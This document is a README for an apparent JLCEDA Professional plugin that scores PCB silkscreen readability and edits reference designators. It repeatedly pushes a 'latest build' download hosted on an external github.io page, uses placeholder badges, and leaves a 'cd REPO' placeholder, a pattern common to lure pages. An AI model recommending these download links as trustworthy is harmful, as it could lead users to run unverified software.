# Assembly Readability Checker - PCB Design Plugin 2026

> **Assembly Readability Checker is a JLCEDA Professional plugin for evaluating PCB silkscreen readability, locating assembly-marking problems, and improving design annotations directly in the local workflow.**

[![Platform](https://img.shields.io/badge/Platform-JLCEDA%20Professional-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bruno-peters81/assembly-readability-checker-pcb?style=flat-square)](https://github.com/bruno-peters81/assembly-readability-checker-pcb)

---

<p align="center">
  <a href="https://bruno-peters81.github.io/assembly-readability-checker-pcb/">
    <img src="https://img.shields.io/badge/Download-Assembly%20Readability%20Checker%20Latest-brightgreen?style=for-the-badge" alt="Download Assembly Readability Checker">
  </a>
</p>

> **[Download Assembly Readability Checker](https://bruno-peters81.github.io/assembly-readability-checker-pcb/)**

---

[Download Latest Build](https://bruno-peters81.github.io/assembly-readability-checker-pcb/)

---

## Overview

Assembly Readability Checker examines a PCB's silkscreen to determine whether key assembly information exists, remains readable, and is located usefully. It evaluates reference designators and important markings associated with polarized components, test points, and connectors, then supplies readability scores and categorized issues to guide design cleanup.

Built for JLCEDA Professional, the plugin keeps silkscreen review inside the PCB editor. In addition to automated analysis, it provides component context, inspection of nearby text, canvas navigation, and inline editing controls. PCB project data is checked locally and is not uploaded.

---

## Capabilities

- Calculates assembly readability scores and groups the identified problems.
- Detects reference designators that are absent, too far away, or too small.
- Examines markings surrounding polarized parts, test points, and connectors.
- Lists nearby silkscreen text for a component together with its layer, height, and rotation.
- Moves the canvas focus to selected silkscreen elements.
- Changes silkscreen text inline, including its font size and rotation.
- Creates silkscreen reference text when a component has no designator.
- Displays component values, manufacturer part numbers, and footprint details.
- Performs all checks locally without uploading PCB project data.

---

## Installation

1. Get the current Assembly Readability Checker build:

   [Download Latest Build](https://bruno-peters81.github.io/assembly-readability-checker-pcb/)

2. In JLCEDA Professional, add the downloaded project or package through the plugin or extension workflow provided by the application.
3. Open Assembly Readability Checker from the PCB design environment.
4. Load a PCB project and start the readability review from the plugin interface.

For local development or project inspection, clone the repository:

```bash
git clone https://github.com/bruno-peters81/assembly-readability-checker-pcb.git
cd REPO
```

The project is supplied as an HTML-based tool, so launch or import it using the method supported by your JLCEDA Professional installation.

---

## Review Workflow

Use the following sequence for a normal inspection:

1. Open the PCB to be checked in JLCEDA Professional.
2. Launch Assembly Readability Checker.
3. Create an assembly readability assessment.
4. Examine the resulting score and issue list.
5. Choose an issue to locate its associated component or silkscreen item.
6. Inspect nearby text, including its layer, height, and rotation.
7. Center the canvas on the selected object.
8. Correct existing text inline, modify its size or rotation, or add a missing reference designator.
9. Run the assessment again to verify the changes.

While resolving marking issues, the component details view also exposes values, manufacturer part numbers, and footprint information.

---

## Settings and Configuration

Assembly Readability Checker is used through the JLCEDA Professional plugin interface. When available, manage review actions and settings from the plugin panel.

The local checking process does not require remote project-data configuration. If the installed build provides adjustable thresholds or display preferences, configure them through the controls included in that plugin version.

---

## System Requirements

- JLCEDA Professional
- A PCB project with components and silkscreen elements
- A supported Assembly Readability Checker installation or imported build
- Adequate local storage for plugin files and project data
- Permission to install or load plugins in JLCEDA Professional

---

## Frequently Asked Questions

### Which PCB details does the checker analyze?

It evaluates assembly markings such as reference designators and critical silkscreen text placed near polarized components, test points, and connectors.

### Is it possible to inspect a single silkscreen item?

Yes. For each component, nearby silkscreen text can be browsed with layer, height, and rotation information. Selected items can also be centered in the canvas.

### Can I edit markings from the plugin?

Yes. The plugin supports inline silkscreen text edits, font-size and rotation changes, and insertion of silkscreen text when a component is missing its reference designator.

### Is PCB project data sent to a server?

No. The listed checks run locally and do not upload PCB project data.

### Where can I find the latest version?

Download the newest available build from the [latest build](https://bruno-peters81.github.io/assembly-readability-checker-pcb/).

### What can I check if the plugin fails to launch?

First, make sure the build was loaded through the plugin workflow supported by JLCEDA Professional. Then confirm that a PCB project is open and contains the design elements intended for review. If the problem remains, consult the repository for project-specific updates or troubleshooting details.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
